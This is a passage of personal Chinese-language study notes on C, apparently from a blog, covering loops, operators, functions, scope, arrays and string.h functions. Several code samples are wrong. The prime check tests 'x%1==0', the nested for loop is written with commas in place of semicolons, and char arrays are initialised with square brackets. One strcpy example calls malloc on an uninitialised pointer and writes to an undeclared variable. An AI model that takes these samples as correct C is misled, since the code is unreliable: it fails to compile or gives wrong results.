data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h5 id=\"2for\"><a class=\"anchor\" href=\"#2for\">#</a> 2.for</h5>\n<pre><code>\nfor (初始条件;循环条件;每轮动作)&#123;           //这个动作接到每次循环结尾\n循环体                                   //i的值可以在初始化中定义\n&#125;                                         但是只有C99才行，初始条件可以                                           省略           \n</code></pre>\n<p>循环可以有两种计数方式：</p>\n<p>for (int i=0;i&lt;5;i++)   或者   for (int i=1;i&lt;=5;i++)   都是循环 5 次</p>\n<p>for 循环实际上与 while 是一样的！！！任何 for 都可以改写成 while 循环 。</p>\n<p><strong>// 如果是要固定次数的循环，那么用 for;</strong></p>\n<p><strong>// 如果必需执行一次，就用 do-while 循环；</strong></p>\n<p><strong>// 其他都用 while</strong></p>\n<p>EG: 判断素数</p>\n<pre><code>...\nisPrime=1         //这里实际上是证伪，所以初始为1，用来避免反复输出，for(i=2;i&lt;x;i++) &#123;                    //掐头去尾是这样的\n\tif （x%1==0）&#123;\n\t\tisPrime=0;          //实际上不break也行，但是会反复赋值\n\t\tbreak;              //continue只会直接跳到下一轮循环\n\t&#125;\nif isPrime==1&#123;            //这里也可以不用isPrime,直接判断i==x\n\tprintf(&quot;是素数\\n&quot;);      看有没有完整执行for,是否有break掉。\n&#125;else&#123;\nprintf(&quot;不是素数是\\n&quot;);\n&#125;\n&#125;  \n...\n</code></pre>\n<h5 id=\"3循环的嵌套\"><a class=\"anchor\" href=\"#3循环的嵌套\">#</a> 3. 循环的嵌套</h5>\n<p>注意，循环的控制变量必需不一样</p>\n<p>比如，判断 100 以内的素数：// 是素数改成 printf</p>\n<p>可以在之前的代码上套一个</p>\n<pre><code>for (int x=2,x&lt;=100,i++) &#123;&#125;     //记得也要x++\n</code></pre>\n<p>输出 50 个素数：</p>\n<pre><code>int cnt=0;  \nwhile (cnt&lt;50)&#123;&#125;     //输出后记得cnt++\n</code></pre>\n<p>也可以用 for (x=2;cnt&lt;50;x++) // 这时删掉最后的 x++</p>\n<p>EX. 接力 break:<br />\n 这需要一个变量（exit）, 开始是 1，当满足条件时将其赋值为 1，随后多个 break 加上 if，判断 exit 是否为 1（这是为了防止未完成就 break）</p>\n<p>也可以使用 goto, 用法和命令行差不多，但是定义标签时的：在后面。</p>\n<p>这玩意儿最好只用在快速跳出多个循环（要不然乱跳容易乱）</p>\n<h4 id=\"八逻辑运算条件运算\"><a class=\"anchor\" href=\"#八逻辑运算条件运算\">#</a> 八。逻辑运算 / 条件运算 /，</h4>\n<h5 id=\"1逻辑运算\"><a class=\"anchor\" href=\"#1逻辑运算\">#</a> 1. 逻辑运算</h5>\n<p><strong>运算符：</strong></p>\n<p>！：非！a：是 a 就 false，不是则 true</p>\n<p>&amp;&amp;：与           全部 true 则 true</p>\n<p>||：或             一个 true 即可</p>\n<p><strong>优先级：</strong></p>\n<p>()&gt; ! &gt; 关系运算 &gt; &amp;&amp; &gt; || &gt; 赋值运算</p>\n<p><strong>方向：</strong></p>\n<p>自左向右，如果已经不成立，就不会接下去判断，所以，赋值运算不要写到里面，可能不会执行，即发生<strong>短路</strong>。</p>\n<h5 id=\"2条件运算\"><a class=\"anchor\" href=\"#2条件运算\">#</a> 2. 条件运算</h5>\n<p><strong>运算符：</strong></p>\n<p>(条件) <strong>?</strong> 条件满足时的值 <strong>:</strong> 条件不满足的时候的值  // 相当于 if,else</p>\n<p><strong>优先级：</strong></p>\n<p>只大于赋值运算</p>\n<p>嵌套条件表达式：</p>\n<p>自右向左结合（快跑，没有可读性的玩意儿）</p>\n<h5 id=\"3逗号表达式\"><a class=\"anchor\" href=\"#3逗号表达式\">#</a> 3. 逗号表达式</h5>\n<p>优先级：</p>\n<p>最低，比赋值还低，要用到必需通过括号提升优先级</p>\n<p>运算方式：</p>\n<p>取右边值，比如 a=(1,2), 此时 a=2。</p>\n<p>一般不运算，平常在 for 中来加入多个每轮动作（也不是运算.jpg）</p>\n<h1 id=\"ii函数与数组\"><a class=\"anchor\" href=\"#ii函数与数组\">#</a> Ⅱ. 函数与数组</h1>\n<h3 id=\"函数\"><a class=\"anchor\" href=\"#函数\">#</a> 函数</h3>\n<p><strong>// 为了避免重复代码（同时方便维护），或者精简主函数</strong></p>\n<h4 id=\"1定义函数\"><a class=\"anchor\" href=\"#1定义函数\">#</a> 1. 定义函数</h4>\n<p>一般来说，main 函数写在最下面，因为编译器是自上而下看的，否则有可能会编译不通过（这看编译器），如果一定要 main 在前面，可以先来个函数原型声明</p>\n<p>//(其实就是将函数大括号以外的部分复制一份，加个封号然后单独放在 main 函数前面（事实上可以写在里面，原型声明里也可以不用写或乱写参数名称，只要类型定义是一样的就行（不建议））。定义的部分一定要和声明一致，否则 error，如果不声明，且定义部分在 main 函数下面，那么有些编译器会猜测该函数的返回类型，如果和下面实际定义不相同，有可能也会抛出 error (发生类型冲突))//</p>\n<blockquote>\n<p>函数原型声明不能冲突，但是可以放空，表示不确定，这时假设与实际冲突，会按照实际。</p>\n<p>（这样做会没有对输入类型的检查，可以在 double 中传 int, 不会报错但是值不对，如果确实没有，加 void）</p>\n<p>函数中不能定义函数，但可以原型声明。</p>\n</blockquote>\n<p>int (返回类型) hanshuming (函数名) ()(参数表){</p>\n<blockquote>\n<p>// 定义函数还可以用 void (中文意是没有)，表示没有返回值，int 有返回值，return 必需带值，size_t 就是 unsign int 类型</p>\n<p>// 参数表里逗号分割，看到这个就可以断定这段代码是函数，所以即使是空的也要有，输入时是按顺序复制的</p>\n</blockquote>\n<p>函数体</p>\n<p>return 变量</p>\n<blockquote>\n<p>// 返回主函数的结果 int 就是说这里 return 的变量是 int 类型</p>\n</blockquote>\n<p>}</p>\n<p>调用时写为:</p>\n<p>hanshuming (变量) <a href=\"%E5%8F%AA%E6%9C%89%E5%A3%B0%E6%98%8E%E8%A6%81%E5%8A%A0%EF%BC%8C%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89%E4%B8%8D%E7%94%A8\"><strong>;</strong></a></p>\n<p>// 即使不输入什么值，也要括号，否则会 warnning</p>\n<blockquote>\n<p>return:</p>\n<p>1. 停止函数执行，并返回值</p>\n<p>2. 返回一个表达式</p>\n<p>#一个函数中可以有多个 return 语句，这会导致不是单一出口</p>\n<p>调用有返回的函数却不赋值也是可以的，不会警告或报错。</p>\n<p>当然，没返回的肯定不能赋值</p>\n</blockquote>\n<h4 id=\"2参数传递\"><a class=\"anchor\" href=\"#2参数传递\">#</a> 2. 参数传递</h4>\n<p>可以传递：</p>\n<p>字面量，变量，函数返回值，计算结果</p>\n<blockquote>\n<p>有强制类型转换，如果声明的参数是 int，传入的是 double, 这个 double 会变成 int (warning)，反之也是</p>\n</blockquote>\n<p>C 语言只能传值，而不能是变量 (即使是指针，实际上也只是传了个地址数据，也不是把指针本身传递过去)</p>\n<p>形式参数与实际参数</p>\n<p>函数声明的就是形式参数，实际参数是你调用时传过去的数据 (不是变量)</p>\n<p>本地变量 (在函数内部定义的变量就是这个函数的本地变量，包括参数)（局部变量 / 自动变量）</p>\n<p>每次函数运行会产生独立变量空间（栈帧？）</p>\n<p>变量的生存期和作用域：</p>\n<p><img loading=\"lazy\" data-src=\"1728559512145.png\" alt=\"1728559512145\" /></p>\n<p>注意：C 语言没有 jacvascript 的闭包特性，所以完全不能跨。</p>\n<p><img loading=\"lazy\" data-src=\"1728559884799.png\" alt=\"1728559884799\" /></p>\n<p>在 {} 中定义的参数，生存期和作用域也仅限于 {} 中这里即使在 else 中，也不能访问。</p>\n<p>如果是 [static]( 静态存储期 ，全局变量默认有。定义这个，只能改变生存期，不能改作用域，该不可见还是不可见。它的作用在于当这个函数被多次调用时，它的值不会被初始化（不在栈中）), 生存期会变成整个程序，但是作用域没变化</p>\n<p>局部变量优先原则：当在函数中的<a href=\"if%E8%AF%AD%E5%8F%A5%E4%B9%8B%E7%B1%BB%E7%9A%84\">其他类型</a>的 {} 中定义一个在之外定义过的变量，在 {} 中出现，调用的是其中定义的那个，不是原有，比如：</p>\n<p><img loading=\"lazy\" data-src=\"1728565695161.png\" alt=\"1728565695161\" /></p>\n<p>直接写一个<a href=\"%E5%9D%97\"> {}</a> 一般用于调试</p>\n<p>这里输出的两个 a 不一样</p>\n<p><img loading=\"lazy\" data-src=\"1728565791256.png\" alt=\"1728565791256\" /></p>\n<h3 id=\"数组\"><a class=\"anchor\" href=\"#数组\">#</a> 数组</h3>\n<h4 id=\"1定义数组\"><a class=\"anchor\" href=\"#1定义数组\">#</a> 1. 定义数组</h4>\n<p>类型 数组名 [元素个数]   eg.int num [<a href=\"%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%BB%99%E5%A4%A7%E5%B0%8F\">100</a>]     // 索引从 0 开始是第一个，所以只有 0~99</p>\n<p>赋值：</p>\n<p><img loading=\"lazy\" data-src=\"1728786107668.png\" alt=\"1728786107668\" /></p>\n<p>前面一种写法仅限 C99</p>\n<p><strong>定义后必需遍历数组初始化</strong></p>\n<blockquote>\n<p>C 中有个特殊写法，就是 count [number]={0}, 效果和遍历写 0 是一样的</p>\n</blockquote>\n<p>输出时也是循环遍历</p>\n<p><strong>集成化初始时的定义：</strong></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span>      <span class=\"token comment\">// 没有得到值的，都是 0；没有指定索引的，顺延上一个</span></pre></td></tr></table></figure><p>例题：<a href=\"%E5%8F%8D%E6%AD%A3%E4%BD%A0%E7%9F%A5%E9%81%93%E5%9C%A8%E5%93%AA%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9A%84\">统计数组</a></p>\n<h4 id=\"2数组运算\"><a class=\"anchor\" href=\"#2数组运算\">#</a> 2. 数组运算</h4>\n<p>要改变数组中的某一个，使用 search 函数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>loc<span class=\"token operator\">=</span><span class=\"token function\">search</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 不要 []</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>loc<span class=\"token operator\">!=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>          <span class=\"token comment\">// 这个函数没找到会返回 - 1，实际上是初始值，这个函数遍历了每个位置，有就加 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d在第%d个位置上\\n\"</span>，x<span class=\"token punctuation\">,</span>loc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 得到的其实是索引，不是位置，因为初始不是 0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"不存在\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>search () 要提供大小，其实是因为数组作为函数参数时，是作为指针，只传了第一个元素的地址</p>\n<h4 id=\"3数组的大小\"><a class=\"anchor\" href=\"#3数组的大小\">#</a> 3. 数组的大小</h4>\n<p>sizeof 数组 ：得到字节数（对于 int，/4 才是数组内元素的数字）</p>\n<p>对于任意类型，可以用：</p>\n<blockquote>\n<p>sizeof(a)/sizeof(a[0])</p>\n</blockquote>\n<h4 id=\"4数组的赋值\"><a class=\"anchor\" href=\"#4数组的赋值\">#</a> 4. 数组的赋值</h4>\n<p>数组变量本身不能被赋值，也不能将<a href=\"%E6%98%AF%E4%B8%AAconst\">数组赋值给数组</a></p>\n<p>只能<a href=\"%E4%B8%80%E8%88%AC%E9%83%BD%E7%94%A8for,%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%88%B0%3C%E9%95%BF%E5%BA%A6\">遍历</a>：</p>\n<p><img loading=\"lazy\" data-src=\"1728788625234.png\" alt=\"1728788625234\" /></p>\n<p>素数还有一种求法（但是看起来比之前的更长，所以没写在那个 cpp 里面）</p>\n<p><img loading=\"lazy\" data-src=\"1728790633321.png\" alt=\"1728790633321\" /></p>\n<blockquote>\n<p>当发现一个素数时，将他加到 prime 里面去，用 cnt++ 就是可以先写入这个位置，再移到下一个，这样可以从第一个开始写，这是因为非素数都可以由比他小的素数乘以某个数得到。</p>\n</blockquote>\n<p>// 那个 (i+1)%5 是为了控制一行输出 5 个</p>\n<p>其他算法：</p>\n<p><img loading=\"lazy\" data-src=\"1728791561052.png\" alt=\"1728791561052\" /></p>\n<p>就是每使用一个数，就在数组中排除它的倍数</p>\n<p>就是：</p>\n<p><img loading=\"lazy\" data-src=\"1728791648318.png\" alt=\"1728791648318\" /></p>\n<p>// 赋值为 0 表示不是素数，每个数都判断过去是否是它的倍数</p>\n<p>// 第一个 i 用于初始化，后面拿来遍历输出</p>\n<h4 id=\"5二维数组\"><a class=\"anchor\" href=\"#5二维数组\">#</a> 5. 二维数组</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">// 一般认为是三行五列（这是内存中的放法）, 不能 a [i,j]，这样里面是逗号表达式，实际上是 a [j]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>集成化初始定义：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    a<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span>   <span class=\"token comment\">// 内存中都是直接填的，所以写成一维数组也可以</span></pre></td></tr></table></figure><h4 id=\"6字符数组与字符串\"><a class=\"anchor\" href=\"#6字符数组与字符串\">#</a> 6. 字符数组与字符串</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> word<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token char\">'H'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 字符数组</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> word<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token char\">'H'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'\\0'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 字符串，本质上还是字符数组，C 语言中实际上没有叫字符串的东西</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> word<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token char\">'H'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>字符串就是以<span class=\"token number\">0</span>结尾的字符，它表示字符串的结束（不算在字符串长度中，但是占空间<span class=\"token punctuation\">(</span>有索引<span class=\"token punctuation\">)</span>），如果要读入特定个数，记得位数<span class=\"token operator\">+</span><span class=\"token number\">1</span>，留给<span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   特殊的：</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">char</span> word<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>是一个空字符串“\\<span class=\"token number\">0</span>”，而不是普通的字符数组</pre></td></tr></table></figure><h5 id=\"字符串函数stringh\"><a class=\"anchor\" href=\"#字符串函数stringh\">#</a> 字符串函数 &lt;string.h&gt;</h5>\n<p>可以对普通的字符数组操作</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">序号</th>\n<th style=\"text-align:left\">函数 &amp; 目的</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">1</td>\n<td style=\"text-align:left\"><strong>strcpy(s1, s2);</strong> 复制字符串 s2 到字符串 s1。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">2</td>\n<td style=\"text-align:left\"><strong>strcat(s1, s2);</strong> 连接字符串 s2 到字符串 s1 的末尾，作为返回值。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">3</td>\n<td style=\"text-align:left\"><strong>strlen(s1);</strong> 返回字符串 s1 的长度 (不包括结尾 0, 用 char 时 sizeof 就包括，其他类型不用 sizeof，单位不一样)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">4</td>\n<td style=\"text-align:left\"><strong>strcmp(s1, s2);</strong> 如果 s1 和 s2 是相同的，则返回 0；如果 s1&lt;s2 则返回小于 0；如果 s1&gt;s2 则返回大于 0。空格，结尾的 \\0 也会算进去，实际上这个函数就是挨个比较，不相等时输出这两者之间的差值。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">5</td>\n<td style=\"text-align:left\"><strong>strchr(s1, ch);</strong> 返回一个指针，指向字符串 s1 中字符 ch 的第一次出现的位置。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">6</td>\n<td style=\"text-align:left\"><strong>strstr(s1, s2);</strong> 返回一个指针，指向字符串 s1 中字符串 s2 的第一次出现的位置。</td>\n</tr>\n</tbody>\n</table>\n<h6 id=\"strcmp\"><a class=\"anchor\" href=\"#strcmp\">#</a> strcmp:</h6>\n<p>它的原型，可以是：</p>\n<p><img loading=\"lazy\" data-src=\"1729430901698.png\" alt=\"1729430901698\" /></p>\n<h6 id=\"strcpy\"><a class=\"anchor\" href=\"#strcpy\">#</a> strcpy:</h6>\n<p>因为有时不知道这个指针的作用域，防止突然消失，拷贝一份</p>\n<pre><code>char *strcpy(char *restrict dst,const char *restrict src);\n//restrict表明src和dst不重叠（C99），否则会指向同一个地方\n</code></pre>\n<p><strong>这个函数会返回 dst 值</strong></p>\n<p>使用时要申请内存:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>dst <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 为 \\0 提供空间</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span>src<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>它的原型是：</p>\n<p><img loading=\"lazy\" data-src=\"1729434003609.png\" alt=\"\" /></p>\n<p>然后可以传入俩数组（代码里的 const 防止自赋值（指向同地址））</p>\n<p>rest 应该是 ret, 这是因为此时的 dst 指向最后的元素，不能直接返回它</p>\n<p>要先用 ret 记录好初始位置</p>\n<h6 id=\"strchr\"><a class=\"anchor\" href=\"#strchr\">#</a> strchr:</h6>\n<p>还有一个 strrchr 表示从右边开始找</p>\n<p>如果要找第二个：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span><span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这表示从第一个‘l’后一个开始找</span></pre></td></tr></table></figure><p>输出找到的字符前的一段，可以：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//malloc 返回指针 + 1 也是按类型</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>后一段：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 这只是一个字符数组，这里不能是字符串</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">=</span><span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">char</span> c<span class=\"token operator\">=</span><span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 暂存原来的值</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>t<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 将被提前结束的 s 字符数组 copy</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">*</span>p<span class=\"token operator\">=</span>c         <span class=\"token comment\">// 将 s 数组还原</span></pre></td></tr><tr><td 